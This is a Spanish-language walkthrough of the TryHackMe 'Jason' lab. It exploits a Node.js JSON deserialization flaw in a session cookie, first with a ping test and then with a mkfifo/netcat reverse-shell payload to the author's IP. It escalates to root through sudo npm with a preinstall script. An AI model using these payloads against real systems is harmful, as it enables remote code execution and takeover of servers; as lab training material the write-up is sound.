
# Jason

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/0396cbfe-1747-4f33-b9d2-fbafd2634f1d)

***
- Source: https://tryhackme.com/room/jason
- OS: Linux
- Dificultad: Easy
- IP: No estática
- Temas: `Deserialization`, `JavaScript`, `NodeJS`, `PrivEsc`.
***

- Realizamos un escaneo de puertos, para saber a que nos enfrentamos:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Jax]
└─$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.10.39.206 
[sudo] contraseña para kali: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-07 14:15 EST
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 14:15
Scanning 10.10.39.206 [65535 ports]
Discovered open port 80/tcp on 10.10.39.206
Discovered open port 22/tcp on 10.10.39.206
Completed SYN Stealth Scan at 14:15, 16.79s elapsed (65535 total ports)
Initiating Service scan at 14:15
Scanning 2 services on 10.10.39.206
Completed Service scan at 14:16, 25.47s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.39.206.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 14:16
Completed NSE at 14:16, 1.96s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 14:16
Completed NSE at 14:16, 0.51s elapsed
Nmap scan report for 10.10.39.206
Host is up, received user-set (0.24s latency).
Scanned at 2024-02-07 14:15:40 EST for 45s
Not shown: 65200 closed tcp ports (reset), 333 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.18 seconds
           Raw packets sent: 81715 (3.595MB) | Rcvd: 74999 (3.000MB)
~~~

- Tenemos un servidor http en el puerto 80, si le echamos una mirada vemos que podemos introducir una dirección de correo:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/35e511fd-0608-4b0e-8424-f132e983980b)

- Si realizamos la petición POST con curl, vemos que nos retorna algo:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Jax]
└─$ curl -s -X POST 'http://10.10.39.206/?email=test@test.com' -I
HTTP/1.1 200 OK
Set-Cookie: session=eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ==; Max-Age=900000; HttpOnly, Secure
Content-Type: text/html
Date: Wed, 07 Feb 2024 19:31:41 GMT
Connection: keep-alive
Transfer-Encoding: chunked
~~~

- Tenemos una cookie de sesión, con regex podemos verla en texto claro:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Jax]
└─$ curl -s -X POST 'http://10.10.39.206/?email=test@test.com' -I | grep -oE 'session=[^;]+' | awk -F= '{print $2}' | base64 -d 2>/dev/null
{"email":"test@test.com"}
~~~

- Y bien, al parecer se trata de un objeto json que serializa el correo para procesarlo.
- Probé utilizar una [vulnerabilidad de deserialización en json](https://book.hacktricks.xyz/pentesting-web/deserialization) que funcionó, solo modifiqué añadiendo paréntesis al final para que la instrucción se ejecute inmediatamente.
- Hice varias pruebas, con comandos como `ls`, `sleep`, etc, pero ninguno funcionaba, solo funcionó una prueba de ping que hice:
  
~~~json
{"email":"_$$ND_FUNC$$_function(){ require('child_process').exec('ping -c 3 10.2.60.167', function(error, stdout, stderr) { console.log(stdout) })}()"}
~~~

- Lo codifiqué con el `Decoder de Burpsuite` en base64, y realicé una solicitud GET al server con esta cookie de sesión:

~~~http
GET / HTTP/1.1
Host: 10.10.39.206
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: session=eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpeyByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygncGluZyAtYyAzIDEwLjIuNjAuMTY3JywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSl9KCkifQo=
Upgrade-Insecure-Requests: 1
~~~

- Me puse en escucha con `tcpdump` y vi que había respuesta:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Jax]
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:16:31.227265 IP 10.10.39.206 > 10.2.60.167: ICMP echo request, id 7, seq 1, length 64
15:16:31.227408 IP 10.2.60.167 > 10.10.39.206: ICMP echo reply, id 7, seq 1, length 64
15:16:32.229813 IP 10.10.39.206 > 10.2.60.167: ICMP echo request, id 7, seq 2, length 64
15:16:32.229873 IP 10.2.60.167 > 10.10.39.206: ICMP echo reply, id 7, seq 2, length 64
15:16:33.231161 IP 10.10.39.206 > 10.2.60.167: ICMP echo request, id 7, seq 3, length 64
15:16:33.231195 IP 10.2.60.167 > 10.10.39.206: ICMP echo reply, id 7, seq 3, length 64
~~~

- Entonces, sería cuestión de cambiar el objeto por algo así:

~~~json
{"email":"_$$ND_FUNC$$_function(){ require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.60.167 4444 >/tmp/f', function(error, stdout, stderr) { console.log(stdout) })}()"}
~~~

- Y ya tendríamos conexión:

~~~bash
┌──(kali💀Dedsec)-[~/Maquinas/Linux/Jax]
└─$ nc -lvnp 4444   
listening on [any] 4444 ...
connect to [10.2.60.167] from (UNKNOWN) [10.10.39.206] 37746
sh: 0: can't access tty; job control turned off
$ id
uid=1000(dylan) gid=1000(dylan) groups=1000(dylan)
~~~

- Hacemos un tratamiento de la TTY y ya podríamos comenzar a buscar algo para escalar privilegios:

~~~bash
script /dev/null -c bash
^Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
~~~

***
<h3>PrivEsc:</h3>

- Enumeré algunas cosas básicas en permisos, y descubrí que podemos ejecutar cierto binario con permisos de root:

~~~bash
dylan@jason:/opt/webapp$ sudo -l
Matching Defaults entries for dylan on jason:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *
dylan@jason:/opt/webapp$ /usr/bin/npm
~~~

- En [GTFObins](https://gtfobins.github.io/gtfobins/npm/) hay un apartado para este binario, siguiendo las instrucciones podemos hacer lo siguiente:

~~~bash
dylan@jason:/opt/webapp$ TF=$(mktemp -d)
dylan@jason:/opt/webapp$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
dylan@jason:/opt/webapp$ sudo npm -C $TF --unsafe-perm i
[..................] | rollbackFailedOptional: verb npm-session 1d957450bad5d
> @ preinstall /tmp/tmp.G1zarlqJXR
> /bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)
~~~

- Y eso sería todo, es una máquina demasiado sencilla, pero que sirve de igual forma para repasar conceptos de deserialización y enumeración muy básicos.
